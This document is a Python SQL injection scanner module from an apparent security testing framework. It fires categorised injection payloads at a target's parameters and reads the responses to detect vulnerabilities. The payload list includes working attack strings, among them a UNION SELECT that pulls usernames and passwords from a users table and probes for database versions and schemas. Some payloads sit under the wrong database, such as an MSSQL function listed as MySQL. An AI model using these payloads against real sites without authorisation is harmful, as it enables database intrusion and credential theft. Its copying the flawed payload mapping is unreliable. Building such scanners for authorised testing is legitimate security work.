# src/modules/web/sql_injector.py
import re
import time
import random
import threading
from typing import Dict, List, Optional, Tuple, Any, Union
from concurrent.futures import ThreadPoolExecutor, as_completed
from enum import Enum, auto
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from src.core.scan_manager import ScanResult, ScanStatus, ScanTarget
from src.utils.logger import get_logger
from src.utils.validators import validate_url, sanitize_input
from src.core.event_system import Event, event_system
from src.utils.network import NetworkHelpers
from src.utils.config import config

logger = get_logger(__name__, structured=True)

class SQLInjectionType(Enum):
    """Enumeration of SQL injection techniques with severity levels"""
    ERROR_BASED = (auto(), "high")
    BOOLEAN_BASED = (auto(), "medium")
    TIME_BASED = (auto(), "medium")
    UNION_BASED = (auto(), "high")
    STACKED_QUERIES = (auto(), "critical")

    def __init__(self, value, severity):
        self._value_ = value
        self.severity = severity

class SQLInjectionResult:
    """Detailed result container for SQL injection tests"""
    
    def __init__(self):
        self.vulnerable = False
        self.technique: Optional[SQLInjectionType] = None
        self.payload: Optional[str] = None
        self.evidence: Optional[str] = None
        self.parameter: Optional[str] = None
        self.response_time: Optional[float] = None
        self.response_length: Optional[int] = None
        self.response_code: Optional[int] = None
        self.database_indicator: Optional[str] = None
        
    def to_dict(self) -> Dict[str, Any]:
        return {
            "vulnerable": self.vulnerable,
            "technique": self.technique.name if self.technique else None,
            "severity": self.technique.severity if self.technique else None,
            "payload": self.payload,
            "evidence": self.evidence,
            "parameter": self.parameter,
            "response_time": self.response_time,
            "response_length": self.response_length,
            "response_code": self.response_code,
            "database_indicator": self.database_indicator
        }

class SQLInjector:
    """Advanced SQL injection detection module with multiple techniques"""
    
    # Payloads categorized by technique and database fingerprint
    PAYLOADS = {
        SQLInjectionType.ERROR_BASED: {
            "generic": ["'", "\"", "' OR 1=1 --", "\" OR \"\"=\""],
            "mysql": [
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT (ELT(1=1,1))),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
                "' AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT @@version),0x3a)) --"
            ],
            "mssql": ["' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --"],
            "oracle": ["' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) --"]
        },
        SQLInjectionType.BOOLEAN_BASED: {
            "generic": [
                "' OR 1=1 --",
                "' AND 1=0 --",
                "' OR 'a'='a' --",
                "' OR ''='"
            ],
            "mysql": ["' OR BINARY_CHECKSUM(1)=1 --"],
            "mssql": ["' OR @@PACK_RECEIVED=@@PACK_SENT --"],
            "oracle": ["' OR (SELECT NVL(RAWTOHEX(DBMS_CRYPTO.HASH(UTL_RAW.CAST_TO_RAW('test'),2),'0') FROM dual)='0' --"]
        },
        SQLInjectionType.TIME_BASED: {
            "generic": [
                "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0; WAITFOR DELAY '0:0:5' --",
                "' OR IF(1=1,SLEEP(5),0) --"
            ],
            "mysql": ["' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --"],
            "mssql": ["'; WAITFOR DELAY '0:0:5' --"],
            "oracle": ["' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NULL --"],
            "postgresql": ["' OR (SELECT pg_sleep(5)) --"]
        },
        SQLInjectionType.UNION_BASED: {
            "generic": [
                "' UNION SELECT null,CONCAT(username,0x3a,password) FROM users --",
                "' UNION SELECT null,table_name FROM information_schema.tables --"
            ]
        }
    }
    
    # Database error patterns for fingerprinting
    DB_ERROR_PATTERNS = {
        "mysql": [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySqlClient\."
        ],
        "mssql": [
            r"Microsoft SQL Server",
            r"ODBC Driver",
            r"SQL Server.*Driver",
            r"System.Data.SqlClient"
        ],
        "oracle": [
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*"
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"PSQLException"
        ]
    }
    
    TIME_THRESHOLD = 3  # Seconds to consider time-based injection
    DEFAULT_TIMEOUT = 10
    DEFAULT_THREADS = 5

    def __init__(
        self,
        target: Union[str, ScanTarget],
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None,
        timeout: int = DEFAULT_TIMEOUT,
        thread_count: int = DEFAULT_THREADS
    ):
        """
        Initialize SQL injection scanner
        
        Args:
            target: Target URL or ScanTarget object
            method: HTTP method (GET/POST)
            headers: Optional HTTP headers
            data: Optional POST data
            timeout: Request timeout in seconds
            thread_count: Number of threads for parallel testing
        """
        if isinstance(target, ScanTarget):
            self.target = target
            self.url = target.host
        else:
            self.url = target
            self.target = ScanTarget(host=target)
            
        if not validate_url(self.url):
            raise ValueError(f"Invalid URL provided: {self.url}")
            
        self.method = method.upper()
        self.headers = headers or {}
        self.original_data = data or {}
        self.timeout = timeout
        self.thread_count = thread_count
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self._stop_event = threading.Event()
        
        # Parse URL components
        self.parsed_url = urlparse(self.url)
        self.base_url = urlunparse(self.parsed_url._replace(query=None, fragment=None))
        self.query_params = parse_qs(self.parsed_url.query, keep_blank_values=True)
        
        logger.info(
            "SQLInjector initialized",
            extra={
                "data": {
                    "target": self.url,
                    "method": self.method,
                    "parameters": list(self.query_params.keys()) if self.method == "GET" else list(self.original_data.keys()),
                    "timeout": self.timeout,
                    "threads": self.thread_count
                }
            }
        )

    def stop(self) -> None:
        """Stop active scanning"""
        self._stop_event.set()
        logger.info("SQL injection scan stopped by request")

    def _send_request(
        self,
        params: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None,
        timeout: Optional[int] = None
    ) -> requests.Response:
        """Send HTTP request with error handling"""
        timeout = timeout or self.timeout
        
        try:
            if self.method == "GET":
                return self.session.get(
                    self.base_url,
                    params=params,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )
            else:
                return self.session.post(
                    self.base_url,
                    data=data,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )
        except requests.exceptions.RequestException as e:
            logger.warning(
                "Request failed during SQL injection test",
                extra={"data": {"url": self.url, "error": str(e)}}
            )
            raise

    def _get_baseline_response(self, param: str) -> Optional[requests.Response]:
        """Get baseline response for comparison"""
        try:
            if self.method == "GET":
                baseline_params = self.query_params.copy()
                baseline_params[param] = ["1"]  # Safe value for baseline
                return self._send_request(params=baseline_params)
            else:
                baseline_data = self.original_data.copy()
                baseline_data[param] = "1"
                return self._send_request(data=baseline_data)
        except Exception as e:
            logger.warning(
                "Failed to get baseline response",
                extra={"data": {"parameter": param, "error": str(e)}}
            )
            return None

    def _detect_database(self, response_text: str) -> Optional[str]:
        """Attempt to identify database from error messages"""
        for db_type, patterns in self.DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return db_type
        return None

    def _test_payload(
        self,
        param: str,
        payload: str,
        technique: SQLInjectionType
    ) -> Optional[SQLInjectionResult]:
        """Test a single payload against a parameter"""
        if self._stop_event.is_set():
            return None
            
        result = SQLInjectionResult()
        result.parameter = param
        result.payload = payload
        result.technique = technique
        
        try:
            # Prepare test data
            test_params = None
            test_data = None
            
            if self.method == "GET":
                test_params = self.query_params.copy()
                test_params[param] = [payload]
                request_params = {k: v[0] if len(v) == 1 else v for k, v in test_params.items()}
            else:
                test_data = self.original_data.copy()
                test_data[param] = payload
            
            # Send request and measure time
            start_time = time.time()
            
            if self.method == "GET":
                response = self._send_request(params=request_params)
            else:
                response = self._send_request(data=test_data)
                
            response_time = time.time() - start_time
            result.response_time = response_time
            result.response_code = response.status_code
            result.response_length = len(response.content)
            
            # Database fingerprinting
            db_type = self._detect_database(response.text)
            if db_type:
                result.database_indicator = db_type
            
            # Technique-specific detection logic
            if technique == SQLInjectionType.ERROR_BASED:
                if db_type or any(
                    re.search(pattern, response.text, re.IGNORECASE)
                    for patterns in self.DB_ERROR_PATTERNS.values()
                    for pattern in patterns
                ):
                    result.vulnerable = True
                    result.evidence = "Database error in response"
                    return result
                    
            elif technique == SQLInjectionType.BOOLEAN_BASED:
                baseline = self._get_baseline_response(param)
                if baseline and (response.text != baseline.text or response.status_code != baseline.status_code):
                    result.vulnerable = True
                    result.evidence = "Different response for boolean condition"
                    return result
                    
            elif technique == SQLInjectionType.TIME_BASED:
                if response_time >= self.TIME_THRESHOLD:
                    result.vulnerable = True
                    result.evidence = f"Delayed response ({response_time:.2f}s)"
                    return result
                    
            elif technique == SQLInjectionType.UNION_BASED:
                baseline = self._get_baseline_response(param)
                if baseline and (len(response.content) > len(baseline.content) + 100 and 
                    any(keyword in response.text.lower() for keyword in ["user", "password", "table", "column"])):
                    result.vulnerable = True
                    result.evidence = "Union-based injection response detected"
                    return result
                    
        except Exception as e:
            logger.debug(
                "Payload test failed",
                extra={
                    "data": {
                        "parameter": param,
                        "payload": payload,
                        "technique": technique.name,
                        "error": str(e)
                    }
                }
            )
        
        return None

    def _test_parameter(
        self,
        param: str,
        techniques: List[SQLInjectionType] = None
    ) -> List[SQLInjectionResult]:
        """Test all payloads against a single parameter"""
        if self._stop_event.is_set():
            return []
            
        techniques = techniques or list(SQLInjectionType)
        results = []
        
        for technique in techniques:
            if self._stop_event.is_set():
                break
                
            payloads = self.PAYLOADS.get(technique, {}).get("generic", [])
            db_specific_payloads = []
            
            # If we have database info, try specific payloads
            if hasattr(self, 'database_indicator'):
                db_specific_payloads = self.PAYLOADS.get(technique, {}).get(self.database_indicator, [])
                
            for payload in payloads + db_specific_payloads:
                if self._stop_event.is_set():
                    break
                    
                result = self._test_payload(param, payload, technique)
                if result:
                    results.append(result)
                    if result.vulnerable:
                        # If we find a vulnerability, update database info if available
                        if result.database_indicator and not hasattr(self, 'database_indicator'):
                            self.database_indicator = result.database_indicator
                        return results  # Early exit if vulnerability found
                        
        return results

    def scan(
        self,
        params: Optional[List[str]] = None,
        techniques: Optional[List[SQLInjectionType]] = None
    ) -> ScanResult:
        """
        Perform comprehensive SQL injection scan
        
        Args:
            params: Specific parameters to test (None for all)
            techniques: Specific techniques to try (None for all)
            
        Returns:
            ScanResult with vulnerability information
        """
        scan_result = ScanResult(
            module="SQLInjector",
            target=self.target,
            status=ScanStatus.RUNNING
        )
        
        try:
            test_params = params or (
                list(self.query_params.keys()) if self.method == "GET" 
                else list(self.original_data.keys())
            )
            
            if not test_params:
                logger.warning("No parameters available for testing")
                scan_result.status = ScanStatus.COMPLETED
                return scan_result
                
            vulnerabilities = []
            
            with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
                futures = {
                    executor.submit(self._test_parameter, param, techniques): param
                    for param in test_params
                }
                
                for future in as_completed(futures):
                    if self._stop_event.is_set():
                        break
                        
                    param_results = future.result()
                    for result in param_results:
                        if result.vulnerable:
                            vulnerabilities.append(result.to_dict())
                            event_system.emit(
                                "vulnerability_found",
                                {
                                    "type": "sql_injection",
                                    "severity": result.technique.severity,
                                    "details": result.to_dict()
                                }
                            )
                            
            if vulnerabilities:
                scan_result.status = ScanStatus.VULNERABLE
                scan_result.data = {
                    "vulnerabilities": vulnerabilities,
                    "summary": {
                        "total": len(vulnerabilities),
                        "by_technique": {
                            tech.name: len([v for v in vulnerabilities if v["technique"] == tech.name])
                            for tech in SQLInjectionType
                        },
                        "by_parameter": {
                            param: len([v for v in vulnerabilities if v["parameter"] == param])
                            for param in test_params
                        }
                    }
                }
            else:
                scan_result.status = ScanStatus.COMPLETED
                scan_result.data = {"message": "No SQL injection vulnerabilities found"}
                
        except Exception as e:
            logger.error(
                "SQL injection scan failed",
                extra={"data": {"error": str(e), "url": self.url}},
                exc_info=True
            )
            scan_result.status = ScanStatus.FAILED
            scan_result.data = {"error": str(e)}
            
        return scan_result

# Example usage:
# target = ScanTarget(host="http://example.com/login.php")
# injector = SQLInjector(target)
# result = injector.scan()
# print(result.to_json())